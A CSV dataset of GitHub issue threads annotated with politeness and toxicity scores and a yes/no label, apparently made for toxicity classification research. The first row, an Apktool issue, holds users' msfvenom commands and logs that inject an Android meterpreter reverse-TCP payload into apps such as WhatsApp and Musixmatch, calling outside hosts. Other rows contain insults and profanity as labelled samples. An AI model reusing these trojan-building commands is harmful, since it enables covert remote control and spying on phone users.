_id,perspective_score,owner,repo,title,length,num_one_letter_word,num_non_alpha_in_middle,subjectivity,num_mention,comments,num_modal_word,total_reference,num_punct,stanford_polite,nltk_score,num_capital,num_QEMark,label,context
Apktool/iBotPeaches/1707,0.109625625,iBotPeaches,Apktool,Error: Unable to rebuild apk with apktool,7376,35,283,0.684210526,1,"I am using apktool v 2.3.1. on Kali Linux. I get this error. Yesterday I have tried and it worked, today I get this error with any APK, tried at least 10. "" Using APK template Whatsappo.apk No platform was selected, choosing MsfModulePlatformAndroid from the payload No Arch selected, selecting Arch dalvik from the payload [] Creating signing key and keystore.. [] Decompiling original APK.. [] Decompiling payload APK.. [] Locating hook point.. [] Adding payload as package com.whatsapp.zumvr [] Loading /tmp/d20180110-6408-1ej4cd4/original/smali/com/whatsapp/AppShell.smali and injecting payload.. [] Poisoning the manifest with meterpreter permissions.. [] Adding &lt;uses-permission androidname=""android.permission.READ_CALL_LOG""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.SET_WALLPAPER""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.READ_SMS""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.CALL_PHONE""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.WRITE_CALL_LOG""/&gt; [*] Rebuilding Whatsappo.apk with meterpreter injection as /tmp/d20180110-6408-1ej4cd4/output.apk Error Unable to rebuild apk with apktool ""  Unfortunately apktool seems to be packaged into a 3rd party application here using apktool to pack some payload into an application. The reason for the build failure is not including in this stacktrace so nothing I can do here. Thanks for the report, but not enough details here for me to investigate.  What details do you need? I will provide because I really need to get this fixed  Generally every bit of details that the issue template requests. You removed it and just posted a stacktrace of a 3rd party tool that didn't even expose the stacktrace from Apktool. So generally useless for me. I would report this to whatever tool this is.  I am really sorry, I'm in a hurry. msfvenom -x Whatsappo.apk -p android/meterpreter/reverse_tcp LHOST=MY IPLPORT=6666 -o W.apk Using APK template Whatsappo.apk No platform was selected, choosing MsfModulePlatformAndroid from the payload No Arch selected, selecting Arch dalvik from the payload [] Creating signing key and keystore.. [] Decompiling original APK.. [] Decompiling payload APK.. [] Locating hook point.. [] Adding payload as package com.whatsapp.megzx [] Loading /tmp/d20180110-6779-18jmnct/original/smali/com/whatsapp/AppShell.smali and injecting payload.. [] Poisoning the manifest with meterpreter permissions.. [] Adding &lt;uses-permission androidname=""android.permission.WRITE_CALL_LOG""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.READ_CALL_LOG""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.SET_WALLPAPER""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.CALL_PHONE""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.READ_SMS""/&gt; [*] Rebuilding Whatsappo.apk with meterpreter injection as /tmp/d20180110-6779-18jmnct/output.apk Error Unable to rebuild apk with apktool root@friend~/Desktop/MSF/Original APKS#  how to fix this error msfvenom -x /root/Desktop/Musixmatch.apk -p android/meterpreter/reverse_tcp LHOST=197.231.43.178 LPORT=6060 -o /root/Desktop/Musixmatchreload.apk Using APK template /root/Desktop/Musixmatch.apk No platform was selected, choosing MsfModulePlatformAndroid from the payload No Arch selected, selecting Arch dalvik from the payload [] Creating signing key and keystore.. [] Decompiling original APK.. [] Decompiling payload APK.. [] Locating hook point.. [] Adding payload as package com.musixmatch.android.lyrify.pnriw [] Loading /tmp/d20180528-4429-p0wqf6/original/smali/o/abm.smali and injecting payload.. [] Poisoning the manifest with meterpreter permissions.. [] Adding &lt;uses-permission androidname=""android.permission.ACCESS_FINE_LOCATION""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.CALL_PHONE""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.CHANGE_WIFI_STATE""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.READ_CONTACTS""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.SET_WALLPAPER""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.READ_CALL_LOG""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.SEND_SMS""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.ACCESS_COARSE_LOCATION""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.WRITE_CONTACTS""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.RECEIVE_SMS""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.CAMERA""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.WRITE_CALL_LOG""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.READ_SMS""/&gt; [*] Rebuilding /root/Desktop/Musixmatch.apk with meterpreter injection as /tmp/d20180528-4429-p0wqf6/output.apk Error Unable to rebuild apk with apktool  really . is there no solution  Error Unable to rebuild apk with apktool  any one have a solution?  here you can solve the problem as i answered this question on stackoverflow Link To The Answer On Stack Over Flow  Error Unable to rebuild apk with apktool my apktool is already updated  I too have the same error root@friend~/Downloads# msfvenom -x myidea.apk -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=11560 -o /root/Desktop/myideafreerecharge.apk Using APK template myidea.apk [-] No platform was selected, choosing MsfModulePlatformAndroid from the payload [-] No arch selected, selecting arch dalvik from the payload [] Creating signing key and keystore.. [] Decompiling original APK.. [] Decompiling payload APK.. [] Locating hook point.. [] Adding payload as package com.ideacellular.myidea.qwpse [] Loading /tmp/d20181112-9095-1hglxlh/original/smali/com/ideacellular/myidea/MyIdeaApplication.smali and injecting payload.. [] Poisoning the manifest with meterpreter permissions.. [] Adding &lt;uses-permission androidname=""android.permission.READ_CALL_LOG""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.WRITE_CONTACTS""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.WRITE_CALL_LOG""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.SET_WALLPAPER""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.RECORD_AUDIO""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.CHANGE_WIFI_STATE""/&gt; [] Adding &lt;uses-permission androidname=""android.permission.RECORD_AUDIO""/&gt; [*] Rebuilding myidea.apk with meterpreter injection as /tmp/d20181112-9095-1hglxlh/output.apk Error Unable to rebuild apk with apktool my apktool is updated to latest version 2.3.4  i have updated the answer on StackOverflow Follow The mentioned link again.  already tried but not working  what didn't work ? did u injected manually and rebuilt your apk using ""android studio"" ?  i have updated my apktool by following ur steps  installed zipalign and tried my process as above  still getting the same error  as i said in ""In The End"" Part , if you still having the rebuilding problem , it's because of apktool that cannot rebuild large apk files, use lower size apk file (&lt;5MB) or use another tool for rebuilding your apk file and inject your Codes or files manually also.  another tools???  same problem when using 1.3 mb file ",5,63,753,0.105263158,0.210526316,593,7,n,
Applied-Energistics-2/AppliedEnergistics/3507,0.17057127,AppliedEnergistics,Applied-Energistics-2,EnderIO combined with AE2 and ThermalExpansion,1040,3,21,0.2,0,"  Description EnderIO does not replace all Flour-Items from AppliedEnergistics2. The Pulverizer from ThermalExpansion normally produces AppliedEnergistics2 Flour, but in combination with EnderIO it just produces AppliedEnergistics2 Disabled Item. All other grinders (like SAG-Mill, Grindstone, etc.) produce the EnderIO dustWheat. Environment Steps to reproduce  Install AppliedEnergistics2, ThermalExpansion and EnderIO Place a Pulverizer, power it and put Wheat in it. AppliedEnergistics2 Disabled Item is produced  EnderIO 1.12.2-5.0.21  EnderCore 1.12.2-0.5.18 Minecraft 1.12.2 Forge 14.23.3.2655 AppliedenErgistics2 rv5-stable-11 ThermalExpansion 1.12.2-5.4.2.25-universal   Oh never mind... Going to replace AE2 with Refined Storage and ask everyone with similar problems to do so as well... They at least respond to issue posts... And they don't have this and similar problems... Bye bye AE2  No need to become rude just because you are impatient. The devs are doing it for free and don't owe you shit so you are free to not use ae2 ",0,0,53,0,0.6,73,0,y,
Applied-Energistics-2/AppliedEnergistics/3800,0.107407905,AppliedEnergistics,Applied-Energistics-2,ConcurrentModificationException when loading into world,5301,23,210,0.5,1,"Whenever i load my world my fps stutters heavily and eventually the game freezes  When the game locks it never starts back up again, Using custom modpack i made in twitch client, in Singleplayer log  Version 1.12.2 AE2 Version rv6-stable-3 Forge Version 14.23.5.2770   Does this happen always? If so can you try and reduce the amount of mods to a mininum amount possible, or alternative remove just one or 2 until it no longer appears? On the first glance it looks like something tries to use multithreaded worldloading, which is just wrong and we are just the first mod affected by it and crash therefore.  Will do this evening  @friend what was your findings, having same problem in my quite random private SP pack  i couldnt find the mod causing it. No matter the combonation it seemed to happen at random and only in that world  Encountering this too. I have been trying for some days now on a reproduction method but cannot find the cause as of yet. ‚ô†Time 1/7/19 323 AM Description Exception in server tick loop java.util.ConcurrentModificationException     at java.util.LinkedHashMap$LinkedHashIterator.remove(Unknown Source)     at appeng.me.cache.EnergyGridCache.extractProviderPower(EnergyGridCache.java316)     at appeng.me.cache.EnergyGridCache.extractAEPower(EnergyGridCache.java248)     at appeng.me.cache.EnergyGridCache.onUpdateTick(EnergyGridCache.java199)     at appeng.me.GridCacheWrapper.onUpdateTick(GridCacheWrapper.java43)     at appeng.me.Grid.update(Grid.java280)     at appeng.hooks.TickHandler.onTick(TickHandler.java228)     at net.minecraftforge.fml.common.eventhandler.ASMEventHandler_1573_TickHandler_onTick_TickEvent.invoke(.dynamic)     at net.minecraftforge.fml.common.eventhandler.ASMEventHandler.invoke(ASMEventHandler.java90)     at net.minecraftforge.fml.common.eventhandler.EventBus.post(EventBus.java677)     at net.minecraftforge.fml.common.eventhandler.EventBus.post(EventBus.java634)     at net.minecraftforge.fml.common.FMLCommonHandler.onPostServerTick(FMLCommonHandler.java266)     at net.minecraft.server.MinecraftServer.func_71217_p(MinecraftServer.java712)     at net.minecraft.server.MinecraftServer.run(MinecraftServer.java526)     at java.lang.Thread.run(Unknown Source) A detailed walkthrough of the error, its code path and all known details is as follows -- Head -- Thread Server thread Stacktrace     at java.util.LinkedHashMap$LinkedHashIterator.remove(Unknown Source)     at appeng.me.cache.EnergyGridCache.extractProviderPower(EnergyGridCache.java316)     at appeng.me.cache.EnergyGridCache.extractAEPower(EnergyGridCache.java248)     at appeng.me.cache.EnergyGridCache.onUpdateTick(EnergyGridCache.java199)     at appeng.me.GridCacheWrapper.onUpdateTick(GridCacheWrapper.java43)     at appeng.me.Grid.update(Grid.java280)     at appeng.hooks.TickHandler.onTick(TickHandler.java228)     at net.minecraftforge.fml.common.eventhandler.ASMEventHandler_1573_TickHandler_onTick_TickEvent.invoke(.dynamic)     at net.minecraftforge.fml.common.eventhandler.ASMEventHandler.invoke(ASMEventHandler.java90)     at net.minecraftforge.fml.common.eventhandler.EventBus.post(EventBus.java677) -- Sponge PhaseTracker -- Details     Phase Stack [Empty stack] Stacktrace     at net.minecraft.server.MinecraftServer.handler$onCrashReport$zjk000(MinecraftServer.java3980)     at net.minecraft.server.MinecraftServer.func_71230_b(MinecraftServer.java889)     at net.minecraft.server.dedicated.DedicatedServer.func_71230_b(DedicatedServer.java371)     at net.minecraft.server.MinecraftServer.run(MinecraftServer.java558)     at java.lang.Thread.run(Unknown Source)  can you possibly test without sponge? other than that, this MAY be an power issue, try to add some dense enrgy cells to your network, it is possible that your system has too low capacity and stall during startup in an infinite loop ... and maybe sponge with some tick shenanigangs grinds it to a halt  OP wasn't using Sponge. Sponge has nothing to do with this error.  Was i referring to op?  I quoted your log and the advice was meant in general, how about being constructive and check for what i wrote?  Original poster. If you check his crash report, he's not using Sponge. It's just a bias towards Sponge and if someone is gonna to push bias in-front of me I'm going to slap you down. Stop it.  So in that case perhaps help us out a little. You did not post your whole log so we can not see what mods you have so we cannot look for mods you may have in common with the OP.  3812, #3831 Plenty of crash reports to build enough correlation. I don't understand the Sponge hate and it's completely unnecessary and off-topic. Suddenly people care about this because ""Sponge"". Really interesting.  Asking to try it without sponge is perfectly fine. It could easily be caused by some changes to chunkloading or similar system, which sponge likes to do and some other mod might simply include similar changes because they claimed it should be 5% faster but crashes in return. It would simply remove some variables and could make it easier. Or at least rule it out as possible cause. But it appears you are not actually interested in identifying a potential cause as well as reject a simple and quick request. So I do not see any chance to get something useful out of it from discussing it any further. ",12,1,307,0.083333333,0.333333333,266,5,y,
BEE2.4/BEEmod/937,0.07706064,BEEmod,BEE2.4,Prerelease 28 and 29 fail to build maps,3057,35,18,0.2,2,"This is a problem that many people have. It's a puzzle not building with prerelease 28 or 29. I never copied the output, but let's just say that it could even be blank and it will still fail. I'm trying right now to make a map that involves wall climbing. If you don't know what wall climbing is, you put a cube down to the corner of 2 walls, and put something ontop of it that's small, like a camera. I will try pre release 27 for this, and if it does have this issue, this needs to be fixed in prerelease 30 unless you can give me a fix.  When using BEE2.4 after installing a new version, old resources from past releases will not be overwritten, resulting in bugs that were fixed still being present and some things not working correctly. Your issue clearly seems te be related to this, so in order to solving this annoyance, you will have to do the following 1 - Open Beemod and click on . 2 - Wait 1 minute while Beemod removes their resources from Portal 2. 3 - Verify the Game Cache Files. 4 - Make sure to have downloaded and unzipped the latest Item's Packages and Application version of BEE2.4, and both must be from the same Pre-Release Version, otherwise bugs may occur. Links  (Application)   (Item's Packages) Note that if you are running Beemod on Linux or Mac Os X, or even on 32 Bit versions of Windows, issues can occur. Beemod currently works well only on 64 Bit versions of Windows 7, 8 and 10. 5 - Click on , then uncheck the option . 6 - Now choose your favorite Items &amp; Style and export your palette to the game. 7 - Make sure to save these steps in a text file in case you get similar issues in the future. 8 - Happy mapmaking!  Why close it? It‚Äôs possible that it won‚Äôt work.  This still didn't fix it, so who's the noob now? Give me the actual fix, you bitch.  Woah that came out of nowhere Icy. Calm yourself Lautaro's ways has worked for me and if its not working for you. You probably did something wrong. Or your items are placed in ways that break the map. Check the placement of items and their orientations. Make sure no items are behind/below partial blocks. etc.  it all checks out, I did all of the stuff he said, nothing works... But this error message came through. Get your ass ready though, it's quite long. compile errors.txt  That seems to be your issue but I dont know how to fix that. Ask Lautaro or someone  @friend Please no swearing there is no need for it.  Lol it is pretty fun for me to see when noobs gets mad so easily.  Uhmm... How about no? I am not the author of Beemod, the author is @friend, which is the one who works on the compiler thing. I am just a collaborator. PrayForNoobs  well I need a fix, I even had to have my friend fucking publish one of my levels for me, I don't want everything I make to be my friend's shit anymore.  @friend Please stop with the swearing there is no need for it.  In light of the Bee2 Contributing Guidelines, this issue is getting locked due to excessive fowl language and toxicity. Please do not repeat this behavior in future issues.  @friend Good thinking. ",9,1,109,0.4,0.2,91,4,y,
Contentify/Contentify/398,0.065378968,Contentify,Contentify,[Bug] Errors everywhere. Nothing works at all.,4863,47,12,0,0,"So I installed this for a friend, and already at the installation I noticed that much stuff doesn't work. The current release version has errors with the apache_get_modules function, which is disabled due to security reasons, the script wants access to the php main directory, which a php script NEVER should have access to. And after I gave him all this, I just get that  What the hell.  Ok I found the mistake. Ever heard of case sensitive? Apperently not  Hello Contentify is an open source software without any funding or commercial background (currently at least). Creating and maintaining an entire CMS usually keeps whole companies busy over years, costing up to millions of dollars / euros. Lacking these means you have to try to find smart cutoffs. This is why Contentify has zero tests (automatic tests via PHPUnit etc.) and this is why there is no huge testing phase before a new version of Contentify is released. Sometimes this causes error. You faced one of these, because Contentify is developed on Windows, not on Linux. Windows is case insensitive regarding file names.  Closing this one. Please stick to constructional criticism if you want to get help.  The fact that you say ""Developt on Windows"" shows me that you have no idea. Case Sensivity is something that everyone should follow, and I am sorry that you don't see that. Here your critic First apache_get_modules is a security issue and by default on most webservers disabled Second Your installer ignores the entry at the MySQL data and tries as root anyways, you have to reload the page and try again for it to work, I would guess thats because you first try to connect before reading and saving the mysql data. Third Case sensivity is something that exists since years, and it became a standard under developers to always keep case sensivity in mind. and last but not least If it was developt on windows and does not work on Linux by nature, you should write that in the requirements.  And also thank you for being in the EU and not following the laws. Read it up kiddo DSGVO  Oh also btw WoltLab and WordPress are also Open Source and they have way more features.  Another afront, and again you do not care about the reasons. Ofcourse every developer who creates software that typically runs on a Linux OS has to know about the important differences between the target OS and the development OS. Thus however does not guarantee no typos etc are made. Take a look at your own quote, you quoted me wrong (""Developt""). Nothing else happened @ Contentify. A stupid mistake, yes. But if you do not take the circumstances into account you should be very careful with attacking others. And again, you blame others for not creating a perfect software for free.  No I blame you that since more then 24 hours I have nothing but problems with this. And that just because you didn't wrote a capital C , but instead a lowercase one  But whatever, I will fork it, exchange it and do a pull request. Is that enough Constructive critic for you?  Good. Whetever. I don't care. I am not a user of this, a friend asked me to setup it for him and I said yes and since 24 hours I just have problems. I fixed it now, you know about the Case Sensivity error, I don't care about anything else.  Thank you, for reporting the issues and giving explanations why they are issues. Believe it or not, I understand why you are upset. I work as a professional software developer and I‚Äôd be very upset if a software that I have bought does not work. But that is the point, this is not the case here. The only ‚Äúpayment‚Äù is... if some say ‚Äúthank you‚Äù, I guess. Getting negative feedback is okay but it is frustrating as well if it feels like an attack against the persons that spend their free time on creating something without making any money with it.  Sorry for being a bit harsh. It was just that the tone of your second and third post was quite unfriendly. Honestly, Contentify cannot reach the same high quality level as for example WordPress. WP has a huge community and lots of contributors plus a strong commercial background. None of these is true for Contentify. Therefore, it has no ads ad all, nowhere at all (except of some recommendations which do not generate any money). It does not spy on you or restrict you. DSVGO / GDPR...  If this really is something that interests you, let me ensure you, the only thing you have to worry about is the use of Google Analytics on the contentify.org website. That's the only ""evil"" third party software that is in use. And on our side, we do collect very (extremely?) few client data and we do very (rarely / almost none) analysis of the collected data. And ofcourse we do not sell / share any user data (not including Google Analytics).  @friend Do not listen to him this CMS is great and thanks for creating!  Update Contentify.org is officially GDPR compliant. ",7,2,135,0,0,159,4,y,
Croppie/Foliotek/587,0.15567564,Foliotek,Croppie,Warning! Do not use this plugin,1540,24,15,0.25,1,"I've spent 3 DAYS configuring this plugin to work nicely in a Bootstrap modal and the final result looks UGLY. It turned out that the plugin has numerous issues. In other cases, I'd fill detailed bug reports, but now I feel so desperate... I don't see any sense in posting issues that will duplicate existing ones. If you're reading this while choosing a JS plugin for image cropping, DO NOT USE CROPPIE!!! Go look for any better alternatives. The most important issues that I encountered  when input image is of type JPG and I try to get result (of type PNG by default), it produces a blank image. when  and  and image is zoomed in, it's possible to drag viewport bounds outside of the container bounds. it results in hidden viewport bounds and an overzoomed image; it's impossible for user to fix this, user is forced to refresh the whole page. when  it's impossible to make aspect ratio fixed.  Expected Behavior it works. Actual Behavior it doesn't.  Browser Chrome 71 Plugin version 2.6.2   Sorry you experienced issues with croppie.  I'll be the first to admit that I don't have as much time as I'd like to support this anymore. That being said, plenty of people use croppie with the bootstrap modals  you don't want to use Croppie, that's fine.  I honestly don't care.  But to post an insulting issue in an open source project that I (and several other people) have spent a lot of time building, and have been gracious enough to share with the community  .... is rude. Next time try just asking for help before you lose your temper. ",4,0,56,0.25,0.25,60,3,y,
Doomsday-Trail/AnthonyMarc23/1,0.07908532,AnthonyMarc23,Doomsday-Trail,worked on css and mobile responsiveness,21,0,1,0,0,@friend check it out ,0,0,1,0,0,0,0,n,
FastHub/k0shk0sh/2181,0.028964482,k0shk0sh,FastHub,Strings: Improve Wording & Grammar,357,1,1,0,0,"Proposes several changes to increase ease of reading strings. The general message conveyed has not been changed, but there have been some adjustments  Typos fixed Punctuation added where currently missing Consistency in terms of American/British language (specifically the word ""organizations"") A couple of changes to words which sound better  (cc @friend) ",0,0,10,0,0,8,0,n,
Flexbones/roikles/61,0.05597698,roikles,Flexbones,Taxonomy column in wp admin,262,3,3,0,0,Came across a situation where it was necessary to add a column to the wordpress post list in the backend to show taxonomies per post and it couldn't be simpler to implement just add the following to the Taxonomy arguments in lib/taxonomies.php  Fixed in 846dcdc ,1,0,3,0,0,3,0,n,
FrameworkBenchmarks/TechEmpower/1024,0.071699858,TechEmpower,FrameworkBenchmarks,Delete play-java/scala because they have been replaced by play2-java/scala,133,1,1,0,0,"I removed the dirs in #883, but the dirs were accidentally re-added in when merging PR #1015.  Ah, my bad. Thanks for cleaning it up ",0,0,7,0,0,5,0,n,
GameController/RoboCup-Humanoid-TC/17,0.032588241,RoboCup-Humanoid-TC,GameController,Rhoban Football Club logo,74,0,0,0,0,Adding the Rhoban Football Club logo (HL KID team 16)  Looks good to me ) ,0,0,3,0,0,10,0,n,
ImageSharp/SixLabors/485,0.080479565,SixLabors,ImageSharp,ƒ∞mage file size problem after image.save(...)  is this problem coming from OS or do we need to change something in the code..?,9971,83,98,0.346153846,0,"Prerequisites  [ ] I have written a descriptive issue title [ ] I have verified that I am running the latest version of ImageSharp [ ] I have verified if the problem exist in both  and  mode [ ] I have searched open and closed issues to ensure it has not already been reported  Description   Steps to Reproduce   System Configuration    ImageSharp version Other ImageSharp packages and versions Environment (Operating system, version and so on) .NET Framework version Additional information   please direct questions to our gitter channel as it says in our readme  Thank you,  Scott, for the answer so quick.  I am very new to using this channel. Please accept my excuse.) So the question for me was .. when I save the image, the size of a saved image is not the correct size. I think this problem probably comes from my OS(Windows 10).  I wanted to know if is there another way to save the image in your library. Thank you very much.  This problem I have faced before. When I tried to save image as an object directly, no matter bitmap or image object in windows forms by c#, I had the problem.  The size of the saved image was always wrong. I do not remember but I think I have solved by using file stream class.. It may give a clue. I will try to find a way base on this experience.  Not sure If I can.  @friend can you be more specific? We hardly understand your issue.  When getting incorrect results Are you trying to resize + save your image with ? Or are you trying ImageSharp? (We do not depend on OS services at all btw.) If you are looking for basic ImageSharp resize examples, just go through our main README.  If your issue is ImageSharp specific, and you are getting results different from what you expect Can you please share a basic sample code snippet/console application reproducing your issue with your sample image attached?  The image uploaded is 4.30 MB .the Image saved by the code below is always as less than 1 MB.                 using (var memoryStream = new MemoryStream())                 {                     fl.CopyTo(memoryStream);                     using (Image&lt;Rgba32&gt; image = Image.Load&lt;Rgba32&gt;(memoryStream.ToArray()))                     {                          //with encoder it changes but still wrong                         //without encoder it allways wrong size for saved image                         IImageEncoder imageEncoder = new JpegEncoder()                         {                             Quality = 90,                             Subsample = JpegSubsample.Ratio444                         };                           image.Mutate(x =&gt;                         {                             x.AutoOrient();                             //x.Resize(image.Width / 2, image.Height / 2);                             image.Save&lt;Rgba32&gt;(fileSaveUrl, imageEncoder);                             x.Grayscale();                             image.Save(fileSaveGrayUrl, imageEncoder);                             x.BlackWhite();                             image.Save&lt;Rgba32&gt;(fileSaveBWUrl, imageEncoder);                             x.Lomograph(new SixLabors.Primitives.Rectangle(5, 5, 300, 400));                             image.Save&lt;Rgba32&gt;(fileSaveLMUrl, imageEncoder);                         });                       }                 }   So you mean file size. It wasn't clear from your original post, ""image size"" usually means image dimensions. By applying filters like blackwite or grayscale, you are loosing information, and jpeg is a compressed format, so it works as expected. Do you also get a 4x smaller file size after applying AutoOrient (without doing a resize)? Can you share a sample image reproducing the issue? Can you also explain why is this an issue in your application? Is the image quality insufficient?  on min, please I am installing visual studio preview.  Later on, I will send you both the source image and the output image.  You seem to keep describing what your seeing not what the problem is.. basically we need to know why a 1mb file is wrong. As far as I can see you are taking an image, resizing it so that it 4 times less the number of pixels and are confused about the fact you are getting an image out that's 4 times smaller, personally that's an outcome I would be hoping for.  I guess you need to deal with it. As I have mentioned before. When somehow an image is resized by c# in windows machine I mean visual studio and when we did a save this resized Image directly, Like img.Save(....) , this problems comes out. So it was a long time ago, as I remember, my solution was, to read and write with byte arrays using filestream objects. So my opinion, the problem is not coming from your code but you need to handle this problem. I will share with you the details.  We need to deal with nothing. Our operations work well. You STILL haven't described why 1mb is wrong.  Because I did not resize . ƒ±t should be the same size  //x.Resize(image.Width / 2, image.Height / 2);  it is only comment  4.30 MB the source the destination is less than 1mb without resizing  All that means is you have likely used a better/higher compression ratio than the original source image. Unless the output actually looks wrong to a human eye then it's doing exactly the right thing.  the output looks exactly like the source. Only the source is 4.30 MB output is something like 800kb The properties of output are similar to the source but the size is different. In 10 min I can share proper code and related images . Give me time please I will be more clear.  Then well done you have successfully used imagesharp, and we have saved you alot of space. Your welcome. That's exactly the output imagesharp is trying to accomplish.      public IActionResult OnPost()     {         if (MyFiles.Count &gt; 0)         {             foreach (IFormFile fl in MyFiles)             {                 FileInfo flInfo = new FileInfo(fl.FileName);                 string getExt = flInfo.Extension.ToLower();                 string newFileName = RandomString(5) + getExt;                 string fileSaveUrl = Path.Combine(TempUploadFolderPath, newFileName);                  using (var memoryStream = new MemoryStream())                 {                     fl.CopyTo(memoryStream);                     using (Image&lt;Rgba32&gt; image = Image.Load&lt;Rgba32&gt;(memoryStream.ToArray()))                     {                         image.Mutate(x =&gt;                         {                             image.Save&lt;Rgba32&gt;(fileSaveUrl);                         });                     }                 }              }              return null;         }         else         {             Message = ""File not selected"";         }         return null;     }   source image is 2.24 MB otput image is  474KB  If I use  IImageEncoder like                         IImageEncoder imageEncoder = new JpegEncoder()                         {                             Quality = 90,                             Subsample = JpegSubsample.Ratio444                         };                          image.Mutate(x =&gt;                         {                             image.Save&lt;Rgba32&gt;(fileSaveUrl, imageEncoder);                         });    Images please. Explain please why is this behavior wrong for you? It's a good thing to have smaller files.   source still the same 2.24MB the output image is 1.06MB     better but not similar. I can understand because it passes through jpeg compression but still the difference is big. Still, I think this is the windows issue.  Would be nice to handle. Thank you very much for your patience. I continue to follow you. Have fun  Consider I bought 1 kg apple in the market at home it becomes 300 gr .) or reverse it at home you produce 1Kg apple when you arrived at the market you have 250 gr to sell... It is ok not much important.  Only sounds a bit not natural. )  The difference is staring you in the face. You've clearly demonstrated what affects the output size. Your input images are probably saved at 100 quality, you're saving at 75 and then 90. This changes the way the quantizer within jpeg uses colors and sampling and can cause a massive drop in image size with very little difference in quality. Something you could have easily researched. It's all on Wikipedia for example. Now.... I need you to stop posting here. This is an issue tracker, for real issues not a forum for you to discuss your fantastical ideas. We have clear guidelines which you obviously ignored. If you continue to waste our time you will be blocked. Do you understand?  I did s simply a joke base on  your answer(--Explain please why is this behavior wrong for you? It's a good thing to have smaller files.)  But still the question is there (--Your input images are probably saved at 100 quality, you're saving at 75 and then 90. This changes the way the quantizer ....) In the code, I have an example which saves the image without defining the quality and in another example with defining the quality. The output is not similar but in both, the output is not the correct size. My purpose is trying to understand your library and use it. Because I have found it brilliant. Also, I have shared the issue  I have faced.  For the purpose to help for improving.  Sorry for the joke. The issue is still there...  @friend what we are trying to tell you is there is no issue... the library is working as designed you feed it an image (that may or may not have been previously saved in a optimised fashion) you then save it and we do all the optermisation on the image we can to reduce file size (thus we actually reduce the size significantly), unless there is actual issue with the visual output of the image then we have done our jobs very well and there is no issue/bug. As ee are getting no where repeating the fact that saving a file and reducing the size with out effecting the visual quality is a good thing i'm locking this thread. ",22,0,459,0.076923077,0.576923077,336,11,y,
ImageSharp/SixLabors/513,0.161884173,SixLabors,ImageSharp,Compiling against net451 has multiple errors that are not there for netstandard2.0,3486,32,31,0.8,0,"Description When compiling against net451 I get multiple errors that are no present when compiling against netstandard2.0. Steps to Reproduce The following line will error when compiling against net451. System Configuration  ImageSharp version 1.0.0-beta0003 Other ImageSharp packages and versions n/a Environment (Operating system, version and so on) Windows 10 .NET Framework version All Additional information n/a   The .NETStandard 1.1 target utilized for NET451 is missing some file APIs that you are trying to use. Are you able to target .NET461?  Yeah, that‚Äôs not a bug. We also even show in the example code in the readme that the File API overload requires netstandard 1.3+  Can you explain why you can't target net451? Usually any code that compiles for netstandard2.0 will also compile against net451!  .NET 4.5.1 was released in 2013 and is no longer supported by Microsoft.  Is there a reason you are unable to target a higher framework version?  @friend just take a stream using  and pass it to . @friend on one hand, I really really want to get rid of NET Standard 1.1, but on the other hand there are so many large enterprises having stupid IT limitations keeping them in the stone age. I really wish we knew how many users do we have amongst such companies. @friend is this your case? üòÑ  @friend - The reason a lot of projects target net451 as well as netstandard2.0 is that although you need net461 for netstandard2.0 the API surface for net451 is almost identical to netstandard2.0 and in most cases you will be able to target net451 without any code changes. @friend - For me the two required targets would be net451 and netstandard2.0. The net451 target would allow us to keep supporting customers on Windows Server 2008 with extended maintenance. The netstandard2.0 target would be for for new development. @friend - My personal opinion is that .NET Standard versions earlier than 2.0 are at best confusing. Based on the above grid, my suggestion would be to target netstandard2.0, netstandard1.2 and net451. This would not only give multiple targets but the available methods would be based on capability and not the arbitrary .NET Standard versions.  @friend You do understand with an explicit  target you're asking us to target a brand new library against an obsolete framework with no security updates available?  @friend - Targeting net451 will allow better support for .NET 4.5.1, .NET 4.6, Mono 4.6 to 5.2. If you can target net451 I don't see the problem in doing so as the framework choice is down to the package consumers who might have a valid reason for requiring net451 (e.g. Windows Server 2008).  @friend All of those frameworks are supported by Net Standard 1.1 I think you are failing to understand exactly what a standard is. I suggest you look again at the picture I posted above. You might not see a problem but I most definitely do. Targeting .NET 4.5.1  Adds complexity to the build Can severely limit future development Means that I am now referencing unsupported binaries that may well contain security issues.  And for what? So you can avoid using a FileStream in your consuming code and support an operating system that has another 1 1/2 years of support? There's a sense of entitlement here I am detecting that I find deeply unpleasant. You are asking me to do what a soon to be trillion dollar company will not and cannot do. I'm going to lock this issue now and I suggest you have a good think about your attitude towards open source. ",19,2,103,0,0,117,8,y,
